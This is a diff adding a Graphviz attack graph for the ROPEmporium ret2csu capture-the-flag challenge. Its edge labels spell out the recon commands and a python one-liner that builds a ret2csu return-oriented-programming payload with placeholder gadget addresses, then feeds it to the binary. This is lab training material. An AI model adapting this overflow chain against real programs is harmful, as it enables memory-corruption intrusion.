@@ -1,0 +1,21 @@
+digraph AttackGraph {
+  rankdir=LR;
+  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - ROPEmporium ret2csu"];
+  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
+  edge [color="#555555", fontname="Helvetica", fontsize=10];
+
+  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
+  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Overflow offset identified"];
+  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="ret2win symbol identified"];
+  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="csu gadgets identified"];
+  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Argument values prepared"];
+  node4 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="ret2csu payload crafted"];
+  node5 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Flag printed"];
+
+  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q ./ret2csu"];
+  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="nm ret2csu | grep ret2win"];
+  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d ret2csu | grep __libc_csu_init -A 80"];
+  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="python3 -c \"print(hex(0xdeadbeefdeadbeef))\""];
+  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="python3 -c \"from struct import pack; import sys; pad=b'A'*40; pop_csu=0xCSU_POP_GADGET; call_csu=0xCSU_CALL_GADGET; ret2win=0xRET2WIN; arg1=0xdeadbeefdeadbeef; arg2=0xcafebabecafebabe; arg3=0xd00df00dd00df00d; call_target=0xRET2WIN_PTR; chain=pad + pack('<Q', pop_csu)+pack('<Q',0)+pack('<Q',1)+pack('<Q', call_target)+pack('<Q', arg1)+pack('<Q', arg2)+pack('<Q', arg3)+pack('<Q', call_csu)+b'JUNKJUNK'*7+pack('<Q', ret2win); sys.stdout.buffer.write(chain)\" > payload.bin"];
+  node4 -> node5 [color="#555555", fontname="Helvetica", fontsize="10", label="./ret2csu < payload.bin"];
+}
